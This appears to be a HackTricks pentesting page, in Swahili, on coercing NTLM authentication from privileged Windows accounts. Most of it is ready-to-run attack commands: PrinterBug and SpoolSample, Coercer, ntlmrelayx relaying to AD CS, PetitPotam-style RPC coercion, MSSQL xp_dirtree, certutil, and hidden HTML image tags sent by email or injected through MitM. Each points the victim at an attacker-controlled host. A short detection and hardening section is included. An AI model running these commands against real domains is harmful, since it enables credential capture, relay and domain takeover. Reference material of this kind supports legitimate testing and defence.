# Lazimisha Uthibitishaji wa NTLM wa Akaunti yenye Haki za Juu

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **vichochezi vya uthibitishaji wa mbali** vilivyoandikwa kwa C# kwa kutumia MIDL compiler ili kuepuka dependencies za wahusika wengine.

## Matumizi Mabaya ya Huduma ya Spooler

Ikiwa huduma ya _**Print Spooler**_ **imewezeshwa,** unaweza kutumia baadhi ya credentials za AD ambazo tayari zinajulikana ili **kuomba** seva ya uchapishaji ya Domain Controller ikupe **taarifa mpya** kuhusu kazi mpya za uchapishaji, kisha uiambie tu **itume arifa kwa mfumo fulani**.\
Kumbuka kuwa printa inapotuma arifa kwa mifumo isiyo maalum, inahitaji **kuthibitisha utambulisho wake dhidi ya** **mfumo** huo. Kwa hiyo, mshambuliaji anaweza kusababisha huduma ya _**Print Spooler**_ kuthibitisha utambulisho wake dhidi ya mfumo wowote, na huduma itatumia **akaunti ya kompyuta** katika uthibitishaji huu.

Kwa ndani, primitive ya kawaida ya **PrinterBug** hutumia vibaya **`RpcRemoteFindFirstPrinterChangeNotificationEx`** kupitia **`\\PIPE\\spoolss`**. Mshambuliaji kwanza hufungua handle ya printa/seva, kisha huweka jina bandia la mteja katika `pszLocalMachine`, ili spooler ya lengwa iunde njia ya arifa **inayorejea kwa mashine inayodhibitiwa na mshambuliaji**. Ndiyo maana matokeo yake ni **kulazimisha uthibitishaji wa nje**, badala ya utekelezaji wa msimbo wa moja kwa moja.<sup>[[2]](#references)</sup>\
Ikiwa unatafuta **RCE/LPE** ndani ya spooler yenyewe, angalia [PrintNightmare](printnightmare.md). Ukurasa huu unalenga **kulazimisha uthibitishaji na relay**.

### Kutafuta Seva za Windows kwenye domain

Tumia PowerShell kuorodhesha host za Windows. Kwa kawaida seva ndizo malengo yaliyopewa kipaumbele cha juu zaidi, kwa hiyo zipe kipaumbele kwanza:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Kutambua huduma za Spooler zinazosikiliza

Kwa kutumia toleo lililorekebishwa kidogo la @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), angalia kama Huduma ya Spooler inasikiliza:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Unaweza pia kutumia `rpcdump.py` kwenye Linux na kutafuta itifaki ya **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Au jaribu haraka hosti kutoka Linux kwa kutumia **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Ikiwa unataka **kuorodhesha sehemu za coercion** badala ya kuangalia tu kama spooler endpoint ipo, tumia **Coercer scan mode**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Hii ni muhimu kwa sababu kuona endpoint katika EPM kunakuambia tu kwamba kiolesura cha print RPC kimesajiliwa. **Hakuhakikishi** kwamba kila mbinu ya coercion inaweza kufikiwa kwa mapendeleo yako ya sasa au kwamba host itatoa mtiririko wa uthibitishaji unaoweza kutumika.

### Iambie huduma ijithibitishe dhidi ya host yoyote

Unaweza kucompile [SpoolSample kutoka kwenye repository asilia](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

au tumie [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa unatumia Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Ukiwa na **Coercer**, unaweza kulenga interfaces za spooler moja kwa moja na kuepuka kubahatisha ni RPC method ipi imewekwa wazi:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Callback za kisasa za RPC-over-TCP

Usidhani kuwa mwito wa `RpcRemoteFindFirstPrinterChangeNotificationEx` ukifanikiwa lazima uzalishe trafiki kwenye TCP/445. **Windows 11 22H2 na matoleo ya baadaye hutumia RPC over TCP kwa mawasiliano ya uchapishaji kwa chaguomsingi**; RPC over named pipes huzimwa isipokuwa sera au `RpcUseNamedPipeProtocol=1` iwashe tena. Kwa hiyo, listeners za zamani zinazotumia SMB pekee zinaweza kuripoti kuwa trigger imetumwa ilhali hazipokei callback kamwe. Microsoft inaeleza kuwa TCP/135 (Endpoint Mapper) pamoja na ports za RPC zinazobadilika hutumika kwa RPC ya kawaida ya uchapishaji, na mashirika yanaweza kuzuia masafa haya au kuchagua port isiyobadilika ya RPC ya uchapishaji.<sup>[[10]](#references)</sup>

**Impacket `ntlmrelayx.py`** ya sasa inajumuisha seva ya RPC relay na Endpoint Mapper ndogo, ambayo huwashwa kwa chaguomsingi kwenye TCP/135. Usaidizi huu uliunganishwa mnamo Juni 2025 mahususi pamoja na onyesho la mnyororo wa PrinterBug-to-AD-CS, na kuruhusu RPC callback iliyothibitishwa kupelekwa kupitia relay hata wakati victim haitumii SMB/WebDAV kama njia mbadala.<sup>[[11]](#references)</sup>

Usaidizi wa RPC relay/EPM unapatikana katika **Impacket 0.13.0 na matoleo ya baadaye**. Kabla ya kuchunguza kwa nini listener ya TCP/135 haipo, hakikisha kuwa `ntlmrelayx.py` ya zamani iliyofungwa kwenye kifurushi haiendeshwi; matokeo ya help yanapaswa kuonyesha switches zote mbili za seva ya RPC.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Tafuta `Setting up RPC Server on port 135` na `RPCD: Received connection` kwenye matokeo ya relay. Ikiwa RPC call itarudisha hitilafu inayotarajiwa lakini hakuna kitu kinachofika kwa listener, angalia sera ya print RPC transport ya victim, outbound filtering, DNS resolution, na kama mchakato mwingine tayari unatumia TCP/135. Pia hakikisha `ntlmrelayx` haikuwashwa kwa `--no-rpc-server`.

### Kulazimisha HTTP badala ya SMB kwa kutumia WebClient

Kwenye mifumo ambayo bado inatumia **RPC over named pipes** (legacy builds au tabia iliyorejeshwa na sera), PrinterBug ya kawaida kwa kawaida hutoa uthibitishaji wa **SMB** kwenda `\\attacker\share`, ambao bado unafaa kwa **capture**, **relay kwenda HTTP targets** au **relay pale ambapo SMB signing haipo**.\
Hata hivyo, ku-relay **SMB kwenda SMB** mara nyingi huzuiwa na **SMB signing**, kwa hivyo waendeshaji wanaweza kupendelea kulazimisha uthibitishaji wa **HTTP/WebDAV** badala yake. Hii si mbinu mbadala ya tabia ya RPC-over-TCP iliyoelezwa hapo juu.

Ikiwa huduma ya **WebClient** inaendeshwa kwenye target, listener inaweza kubainishwa kwa namna inayofanya Windows itumie **WebDAV over HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Hili ni muhimu hasa linapotumika pamoja na **`ntlmrelayx --adcs`** au malengo mengine ya HTTP relay kwa sababu huepusha kutegemea uwezekano wa kufanya SMB relay kwenye muunganisho uliolazimishwa. Tahadhari muhimu ni kwamba **WebClient lazima iwe inaendeshwa** kwenye mwathiriwa ili mbinu ya HTTP/WebDAV ifanye kazi.

### Kuchanganya na Unconstrained Delegation

Ikiwa mshambuliaji amekiuka usalama wa kompyuta iliyosanidiwa kwa [Unconstrained Delegation](unconstrained-delegation.md), anaweza **kulazimisha printa ijithibitishe kwa kompyuta hiyo**. Kisha **TGT** ya akaunti ya kompyuta ya printa huhifadhiwa kwenye akiba ya kumbukumbu ya seva pangishi ya unconstrained-delegation, ambapo mshambuliaji anaweza kuipata na kuitumia tena kwa [Pass the Ticket](pass-the-ticket.md).

### Maelezo kuhusu ugunduzi na uimarishaji wa usalama

Njia ya kuaminika zaidi ya kuondoa PrinterBug kwenye DC, PAW au seva isiyotumika kuchapisha ni kusimamisha na kuzima Spooler. Pale ambapo uchapishaji unahitajika, imarisha usalama wa kila lengwa linalowezekana la relay (SMB server signing, LDAP signing/channel binding na EPA kwenye huduma za HTTP kama AD CS) badala ya kudhani kuwa kuzuia TCP/445 kwenye njia ya callback kunatosha.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Ikiwa host bado inahitaji **uchapishaji wa ndani**, udhibiti finyu zaidi ni GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Hii huzuia spooler kupokea miunganisho ya wateja wa mbali (na kushiriki printa) huku huduma ikiendelea kupatikana ndani ya mashine; anzisha upya spooler baada ya kutumia mpangilio huo, kisha rudia ukaguzi wa ufikivu wa MS-RPRN ulio hapo juu.<sup>[[13]](#references)</sup>

Ugunduzi unapaswa kuoanisha mwito uliothibitishwa kwa MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, hasa opnum 62/65 yenye thamani ya callback isiyo ya ndani, na muunganisho wa nje wa SMB, HTTP au RPC unaotoka kwa host ya spooler mara moja baada yake. Weka baseline ya **interface UUID/opnum na jozi za chanzo/lengo**, si ufikiaji wa `\PIPE\spoolss` pekee, kwa sababu print stacks za sasa zinaweza kuweka callback kwenye RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Jedwali la RPC UNC-path coercion (interfaces/opnums zinazosababisha uthibitishaji wa nje)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Maelezo: interface ya uchapishaji ya asynchronous kwenye pipe ileile ya spooler; tumia Coercer kuorodhesha methods zinazofikika kwenye host husika<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (pia kupitia \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnums zinazotumiwa vibaya mara nyingi: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

Dokezo: Methods hizi hupokea vigezo vinavyoweza kuwa na UNC path (kwa mfano, `\\attacker\share`). Inapochakatwa, Windows itathibitisha utambulisho (katika muktadha wa mashine/mtumiaji) kwa UNC hiyo, na hivyo kuwezesha kunasa au ku-relay NetNTLM.\
Kwa matumizi mabaya ya spooler, **MS-RPRN opnum 65** ndiyo primitive inayotumika zaidi na iliyoandikwa vizuri zaidi, kwa sababu vipimo vya protocol vinasema wazi kwamba server huunda channel ya notification kurudi kwa client iliyobainishwa na `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN kupitia \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Athari: lengo hujaribu kufungua njia ya backup log iliyotolewa na kuthibitisha utambulisho kwa UNC inayodhibitiwa na mshambuliaji.<sup>[[1]](#references)</sup>
- Matumizi ya kiutendaji: shurutisha rasilimali za Tier 0 (DC/RODC/Citrix/n.k.) kutuma NetNTLM, kisha i-relay kwa endpoints za AD CS (hali za ESC8/ESC11) au huduma nyingine zenye upendeleo.<sup>[[1]](#references)</sup>

## PrivExchange

Shambulio la `PrivExchange` limetokana na dosari iliyopatikana kwenye **kipengele cha Exchange Server `PushSubscription`**. Kipengele hiki humwezesha mtumiaji yeyote wa domain aliye na mailbox kuilazimisha Exchange server kuthibitisha utambulisho kwa host yoyote iliyotolewa na client kupitia HTTP.

Kwa chaguo-msingi, **huduma ya Exchange huendeshwa kama SYSTEM** na hupewa ruhusa nyingi kupita kiasi (hasa, ina **WriteDacl privileges kwenye domain kabla ya Cumulative Update ya 2019**). Dosari hii inaweza kutumiwa kuwezesha **ku-relay taarifa kwa LDAP na baadaye kutoa database ya domain NTDS**. Katika hali ambazo ku-relay kwa LDAP hakuwezekani, dosari hii bado inaweza kutumiwa ku-relay na kuthibitisha utambulisho kwa hosts nyingine ndani ya domain. Kutumia shambulio hili kwa mafanikio humpa mshambuliaji ufikiaji wa haraka kwa Domain Admin kwa kutumia akaunti yoyote ya mtumiaji wa domain iliyothibitishwa.

## Ndani ya Windows

Ikiwa tayari uko ndani ya mashine ya Windows, unaweza kuilazimisha Windows iunganishe na server kwa kutumia akaunti zenye upendeleo kwa:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Au tumia mbinu hii nyingine: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Inawezekana kutumia lolbin certutil.exe (binary iliyosainiwa na Microsoft) kulazimisha uthibitishaji wa NTLM:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Kupitia email

Ikiwa unajua **anwani ya barua pepe** ya mtumiaji anayeingia kwenye mashine unayotaka ku-compromise, unaweza kumtumia tu **email yenye picha ya 1x1** kama vile

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Mwathiriwa akiifungua, Windows hujaribu kuthibitisha utambulisho.

### MitM

Ikiwa unaweza kufanya shambulio la MitM na kuingiza HTML kwenye ukurasa unaotazamwa na mwathiriwa, jaribu kuingiza picha kama hii:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Njia nyingine za kulazimisha na kuhadaa uthibitishaji wa NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Kuvunja NTLMv1

Ukiweza kunasa [changamoto za NTLMv1, soma hapa jinsi ya kuzivunja](../ntlm/index.html#ntlmv1-attack).\
_Kumbuka kwamba ili kuvunja NTLMv1, unahitaji kuweka changamoto ya Responder kuwa "1122334455667788"_



## References

- [1] [Unit 42 – Kulazimisha Uthibitishaji Kunaendelea Kubadilika](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Itifaki ya Uelekezaji wa Kumbukumbu ya Matukio kwa Mbali](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – mbinu za uthibitishaji wa Windows unaolazimishwa](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Masasisho ya muunganisho wa RPC kwa uchapishaji katika Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Seva ya relay ya RPC na Endpoint Mapper ya ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Toleo la Fortra Impacket 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Ruhusu Print Spooler kupokea miunganisho ya wateja](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
